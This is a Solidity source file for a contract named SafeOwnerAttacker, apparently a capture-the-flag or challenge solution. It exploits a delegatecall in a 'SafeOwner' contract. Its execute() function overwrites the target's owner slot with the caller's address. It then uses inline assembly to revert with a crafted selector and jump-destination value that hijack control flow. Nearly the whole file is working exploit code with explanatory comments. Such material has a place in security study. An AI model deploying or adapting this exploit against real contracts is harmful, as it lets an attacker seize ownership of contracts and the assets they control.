pragma solidity ^0.4.23;

import "./SafeOwner.sol";

contract SafeOwnerAttacker {
    
    address public owner;
    // The first 4 bytes must be equal to SET
    bytes4 internal constant _sel = bytes4(keccak256('Set(uint256)'));

    // This function will be used to work with the delegatecall(makes the Attacker act on the SafeOwner storage) that the function SafeOwner(execute()) calls,
    // this function is responsable to make the owner variable from the SafeOwner contract became the msg.sender.
    function execute(address) public {
        owner = msg.sender;

        bytes4 sel = _sel;
        assembly {
            //Store sel in location 0x0
            mstore(0, sel)
            //Store 1134 to make the Jumpdest
            mstore(0x4, 1134)
            //Return data must b exactly 0x24(36) bytes long
            revert(0, 0x24)
        }
    }
}